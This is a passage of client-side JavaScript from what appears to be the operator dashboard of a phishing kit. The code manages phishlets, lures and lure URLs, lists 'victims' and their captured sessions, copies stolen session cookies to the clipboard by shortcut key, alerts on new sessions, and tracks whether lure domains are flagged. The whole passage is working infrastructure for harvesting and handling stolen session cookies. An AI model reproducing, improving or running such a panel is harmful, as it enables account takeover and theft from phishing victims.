         <button class="btn primary" id="addurl">${t('add')}</button>
         <label class="chk"><input type="checkbox" id="onlyactive" checked> ${t('active_only')}</label>
         <button class="btn" id="copyactive">${t('copy_active')}</button>
         <span class="count" id="urlcount"></span>
       </div><div id="urllist"></div>`;
    $('#addurl').onclick = addUrl;
    $('#nu').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
    $('#nl').addEventListener('keydown', e => { if (e.key === 'Enter') addUrl(); });
    $('#onlyactive').onchange = refreshUrlList; $('#copyactive').onclick = copyActive; urlsInit = true;
  }
  refreshUrlList();
}
async function refreshUrlList() {
  let arr = []; try { arr = await (await fetch('/api/urls')).json(); } catch (e) {}
  window._urls = arr || [];
  const only = $('#onlyactive') && $('#onlyactive').checked;
  const rows = window._urls.filter(u => !only || u.ok);
  const list = $('#urllist'); if (!list) return;
  list.innerHTML = rows.length ? rows.map(u => `
    <div class="urlrow">
      <i class="dd" style="width:7px;height:7px;background:${u.ok ? 'var(--olive)' : 'var(--bad)'};display:inline-block"></i>
      <span class="url" data-copyurl="${esc(u.url)}">${esc(u.url)}</span>
      ${u.label ? `<span class="lab">${esc(u.label)}</span>` : ''}
      <span class="sp"></span>
      <span class="mut">${u.ok ? t('active') : t('down')}</span>
      <button class="btn" data-copyurl="${esc(u.url)}">${t('copy')}</button>
      <button class="btn" data-delurl="${esc(u.url)}">${t('delete')}</button>
    </div>`).join('') : `<div class="empty">${only ? t('url_empty_active') : t('url_empty')}</div>`;
  const act = window._urls.filter(u => u.ok).length;
  if ($('#urlcount')) $('#urlcount').textContent = t('url_saved')(act, window._urls.length);
}
async function addUrl() {
  const u = $('#nu').value.trim(); if (!u) return; const l = $('#nl').value.trim();
  await fetch('/api/urls', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ url: u, label: l }) });
  $('#nu').value = ''; $('#nl').value = ''; toast(t('url_added')); setTimeout(refreshUrlList, 400);
}
async function copyActive() {
  const act = (window._urls || []).filter(u => u.ok).map(u => u.url);
  if (!act.length) { toast(t('no_active')); return; }
  try { await navigator.clipboard.writeText(act.join('\n')); toast(t('active_copied')(act.length)); } catch (e) { toast(t('error') + ': ' + e); }
}

async function loadDomains() {
  try {
    const arr = await (await fetch('/api/domains')).json();
    const el = $('#domains');
    if (!arr || !arr.length) { el.style.display = 'none'; return; }
    el.style.display = 'flex';
    el.innerHTML = '<span>' + t('domains') + '</span>' + arr.map(d => {
      const cls = d.flagged ? 'flag' : (d.ok ? 'ok' : 'down');
      const st = d.flagged ? t('flagged') : (d.ok ? (d.code + ' · ' + d.latency_ms + 'ms') : (d.err || ('HTTP ' + d.code)));
      return `<span class="dchip" title="${esc(d.url)} · ${esc(d.checked)}"><i class="${cls}"></i>${esc(d.host)} <span class="mut">${esc(st)}</span></span>`;
    }).join('');
  } catch (e) {}
}

async function fetchData(force) {
  try {
    loadDomains(); await loadHealth(); await loadVState();
    if (state.tab === 'urls' && urlsInit) refreshUrlList();
    const d = await (await fetch('/api/data')).json();
    $('#footdb').textContent = d.db + ' · ' + d.now;
    const sig = d.sessions.length + ':' + d.sessions.reduce((m, s) => Math.max(m, s.update || 0), 0) + ':' + d.sessions.reduce((a, s) => a + s.cookies, 0);
    if (!force && sig === state.sig) { renderFacts(); return; }
    const ids = new Set(d.sessions.map(s => s.id));
    if (!state.firstLoad && sig !== state.sig) { const fresh = [...ids].filter(i => !state.knownIds.has(i)); if (fresh.length) toast(t('new_sessions')(fresh.length)); }
    state.sig = sig; state.raw = d.sessions;
    const sel = $('#fphishlet'); const cur = sel.value;
    const phls = [...new Set(d.sessions.map(s => s.phishlet))].sort();
    sel.innerHTML = `<option value="">${t('all_phishlets')}</option>` + phls.map(p => `<option>${esc(p)}</option>`).join('');
    sel.value = cur;
    $('#footsb').textContent = d.sb_enabled ? t('sb_on') : t('sb_off');
    render();
    if (!state.firstLoad) state.knownIds = ids; else { state.knownIds = ids; state.firstLoad = false; }
  } catch (e) { toast(t('load_err') + ': ' + e); }
}

function selectKey(type, key) {
  state.sel = { type, key };
  render();
}
function moveSel(delta) {
  if (!state.rows.length) return;
  const idx = state.rows.findIndex(r => state.sel && r.type === state.sel.type && r.key === state.sel.key);
  const n = Math.max(0, Math.min(state.rows.length - 1, (idx < 0 ? 0 : idx) + delta));
  const r = state.rows[n];
  state.sel = { type: r.type, key: r.key };
  render();
  const want = r.type + ':' + r.key;
  const el = [...document.querySelectorAll('tbody tr[data-sel]')].find(n => n.dataset.sel === want);
  if (el) el.scrollIntoView({ block: 'nearest' });
}
function selectedCopyId() {
  const row = currentSel(); if (!row) return null;
  if (row.type === 'victim') return row.data.best && row.data.best.cookies ? row.data.best.id : null;
  return row.data.cookies ? row.data.id : null;
}

document.addEventListener('click', e => {
  const sort = e.target.closest('[data-sort]');
  if (sort) { const k = sort.dataset.sort; if (state.sort.key === k) state.sort.dir *= -1; else state.sort = { key: k, dir: -1 }; render(); return; }
  const copy = e.target.closest('[data-copy]');
  if (copy) { copyCookies(copy.dataset.copy); return; }
  const view = e.target.closest('[data-view]');
  if (view) { window.open('/cookies?id=' + view.dataset.view, '_blank'); return; }
  const ck = e.target.closest('[data-ck]');
  if (ck) { showCookies(ck.dataset.ck); return; }
  const cu = e.target.closest('[data-copyuser]');
  if (cu) { navigator.clipboard.writeText(cu.dataset.copyuser).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
  const curl = e.target.closest('[data-copyurl]');
  if (curl) { navigator.clipboard.writeText(curl.dataset.copyurl).then(() => toast(t('url_copied'))).catch(err => toast(t('error') + ': ' + err)); return; }
  const del = e.target.closest('[data-delurl]');
  if (del) { if (!confirm(t('confirm_del'))) return; fetch('/api/urls?url=' + encodeURIComponent(del.dataset.delurl), { method: 'DELETE' }).then(refreshUrlList); return; }
  const per = e.target.closest('[data-period]');
  if (per) { state.period = per.dataset.period; render(); return; }
  const reveal = e.target.closest('[data-reveal]');
  if (reveal) {
    reveal.classList.toggle('hide');
    const k = reveal.dataset.reveal;
    if (k) {
      if (reveal.classList.contains('hide')) state.revealed.delete(k);
      else state.revealed.add(k);
    }
    return;
  }
  const tab = e.target.closest('[data-tab]');
  if (tab && tab.closest('.rail')) { state.tab = tab.dataset.tab; state.sel = null; render(); return; }
  const tr = e.target.closest('tbody tr[data-sel]');
  if (tr) { const [type, ...rest] = tr.dataset.sel.split(':'); selectKey(type, rest.join(':')); }
});

let qTimer;
$('#q').addEventListener('input', e => { clearTimeout(qTimer); qTimer = setTimeout(() => { state.q = e.target.value.trim(); render(); }, 160); });
$('#fphishlet').onchange = e => { state.phishlet = e.target.value; render(); };
$('#fvalid').onchange = e => { state.onlyValid = e.target.checked; render(); };
$('#fnoise').onchange = e => { state.showNoise = e.target.checked; render(); };
$('#refresh').onclick = () => fetchData(true);
$('#auto').onclick = () => {
  state.auto = !state.auto; $('#auto').classList.toggle('on', state.auto);
  if (state.auto) { fetchData(false); state.timer = setInterval(() => fetchData(false), 10000); } else clearInterval(state.timer);
};
$('#langbtn').onclick = () => {
  LANG = LANG === 'en' ? 'es' : 'en';
  try { localStorage.setItem('ghostloot_lang', LANG); } catch (e) {}
  setInit = false; urlsInit = false; applyStatic(); render(); loadHealth(); loadDomains();
};
$('#help').addEventListener('click', e => { if (e.target.id === 'help') $('#help').hidden = true; });

document.addEventListener('keydown', e => {
  const typing = /^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement && document.activeElement.tagName);
  if (e.key === '/' && !typing) { e.preventDefault(); $('#q').focus(); return; }
  if (e.key === 'Escape') { $('#help').hidden = true; if (typing) document.activeElement.blur(); return; }
  if (e.key === '?' && !typing) { e.preventDefault(); $('#help').hidden = !$('#help').hidden; return; }
  if (typing) return;
  if (e.key === 'r') { fetchData(true); return; }
  if (e.key === 'c') { const id = selectedCopyId(); if (id) copyCookies(id); return; }
  if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
  if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
  if (e.key >= '1' && e.key <= '6') {
    state.tab = ['dash', 'victims', 'sessions', 'lures', 'urls', 'settings'][+e.key - 1];
    state.sel = null; render();
  }
});

applyStatic();
fetchData(true);
</script>
</body>
</html>
